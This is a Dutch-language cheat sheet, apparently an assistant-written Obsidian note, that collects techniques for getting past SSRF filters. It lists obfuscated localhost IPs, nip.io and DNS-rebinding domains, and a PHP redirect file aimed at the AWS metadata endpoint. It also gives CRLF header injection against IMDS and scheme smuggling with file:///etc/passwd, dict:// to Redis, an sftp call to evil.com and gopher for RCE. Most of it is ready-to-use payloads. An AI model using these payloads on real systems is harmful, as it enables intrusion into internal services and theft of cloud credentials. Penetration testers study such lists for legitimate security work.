
Developers proberen vaak SSRF te voorkomen door een **Blacklist** (verboden lijst) te maken voor `127.0.0.1` of `localhost`.

Hier is de **Master Note** voor **SSRF Bypassing**. Deze bevat alle trucs om die filters te omzeilen.

Kopieer dit blok in je Obsidian vault als: `SSRF - Bypassing.md`.

---

Markdown

````
# 🛡️ SSRF Bypassing & Filter Evasion

==Doel: Interne IP-adressen (zoals 127.0.0.1) of Cloud Metadata bereiken, zelfs als de server zegt "Dit mag niet".==



---

## 🔢 1. IP Obfuscation (IP Vermommen)
*De server filtert op de tekst "127.0.0.1". Maar computers kunnen IP's op veel manieren lezen. Probeer deze variaties:*

| Type | Payload | Uitleg |
| :--- | :--- | :--- |
| **Decimal (Int)** | `http://2130706433` | Het IP als één groot getal. |
| **Octal** | `http://0177.0.0.1` | Nullen ervoor (Linux leest dit als Octal). |
| **Hexadecimal** | `http://0x7f000001` | Hex notatie. |
| **Dotted Hex** | `http://0x7f.0x0.0x0.0x1` | Punten tussen Hex delen. |
| **Zero Short** | `http://0/` | Op Linux is `0` vaak `0.0.0.0` (Localhost). |
| **Missing Zero** | `http://127.1` | De browser vult de nullen aan. |

> [!TIP] Converter Tool
> Gebruik deze online tool om IP's snel om te zetten:
> [IP Obfuscator](https://github.com/vysec/IP-Obfuscator) (of zoek een online converter).

---

## 🎯 2. DNS Spoofing (Magic Domains)
*Als de server cijfers blokkeert, gebruik dan een domeinnaam die stiekem naar 127.0.0.1 wijst.*

### Wildcard Services (NIP.IO / SSLIP.IO)
Deze diensten resolven automatisch naar het IP dat je in de naam zet.
* `http://127.0.0.1.nip.io` --> Wijst naar `127.0.0.1`
* `http://customer1.127.0.0.1.nip.io` --> Wijst naar `127.0.0.1`
* `http://169.254.169.254.nip.io` --> Wijst naar AWS Metadata
* `http://localhost.127.0.0.1.sslip.io`

### DNS Rebinding (Geavanceerd)
*De techniek:*
1.  Server checkt `attacker.com`. DNS zegt: `8.8.8.8` (Veilig! ✅).
2.  Server maakt verbinding met `attacker.com`. DNS zegt nu (TTL 0): `127.0.0.1` (Malicious! 😈).

**Tooling:**
Gebruik [rbndr.us](https://github.com/taviso/rbndr) van Tavis Ormandy.
Payload: `7f000001.80808080.rbndr.us`
*(Wisselt willekeurig tussen 127.0.0.1 en 128.128.128.128)*.

---

## ↪️ 3. HTTP Redirect Bypass
*Als de server redirects (301/302) volgt, checkt hij vaak alleen de eerste URL.*

**Scenario:**
De firewall checkt: `http://jouw-server.com/bypass.php` (Veilig).
Maar jouw bestand stuurt hem direct door naar `127.0.0.1`.

**Maak `bypass.php` op jouw server:**
```php
<?php header("Location: [http://169.254.169.254/latest/meta-data/](http://169.254.169.254/latest/meta-data/)"); ?>
````

Attack URL:

https://target.com/fetch?url=http://jouw-server.com/bypass.php

---

## 👻 4. IPv6 & Alternative Notations

_Filters vergeten vaak IPv6._

- `http://[::1]` (IPv6 Localhost)
    
- `http://[::1]:80`
    
- `http://[0:0:0:0:0:ffff:127.0.0.1]` (IPv4-Mapped IPv6)
    

Enclosed Alphanumerics (Unicode)

Sommige systemen normaliseren vreemde tekens naar normale cijfers na de check.

- `http://①②⑦.⓪.⓪.①`
    
- `http://⑯⑨.②⑤④.⑯⑨.②⑤④`
    

---

## ☁️ 5. Cloud Metadata Bypassing (AWS/GCP)

_Cloud providers beveiligen hun metadata endpoints steeds beter. Hier zijn de trucs._

### AWS URL Encoding

Als de WAF `169.254.169.254` blokkeert.

- `http://169.254.169.254/latest/user-data` -> **BLOCKED**
    
- `http://169.254.169.254/latest/user-data%2500` (Null Byte injection)
    
- `http://ec2-169-254-169-254.compute-1.amazonaws.com/` (DNS naam van het IP)
    

### Header Injection (CRLF)

AWS (IMDSv2) en Google Cloud vereisen specifieke headers.

Als je een CRLF Injection (%0d%0a) hebt in de URL parameter, kun je headers faken.

Payload:

http://169.254.169.254/latest/meta-data/%0d%0aX-Aws-Ec2-Metadata-Token: [TOKEN]

---

## 🕸️ 6. Protocol Smuggling (Niet alleen HTTP)

_Als `http://` geblokkeerd is, probeer andere "schemes"._

|**Scheme**|**Doel**|**Voorbeeld**|
|---|---|---|
|**file://**|Lokale bestanden lezen|`file:///etc/passwd`|
|**dict://**|Redis / Databases|`dict://127.0.0.1:6379/info`|
|**sftp://**|Shell verbindingen|`sftp://evil.com:1337`|
|**ldap://**|Interne Directory|`ldap://127.0.0.1`|
|**gopher://**|**RCE** (Raw TCP streams)|_Gebruik Gopherus tool_|

---

## 📝 Checklist SSRF Bypass

- [ ] **Obfuscation:** Heb ik Decimal, Octal en Hex geprobeerd?
    
- [ ] **DNS:** Heb ik `nip.io` gebruikt?
    
- [ ] **Redirect:** Heb ik een redirect script op mijn eigen server gehost?
    
- [ ] **IPv6:** Heb ik `[::1]` getest?
    
- [ ] **Case Sensitivity:** Heb ik `LocalHost` (hoofdletters) geprobeerd?
    
- [ ] **Protocollen:** Is `http` verplicht of werkt `file://` ook?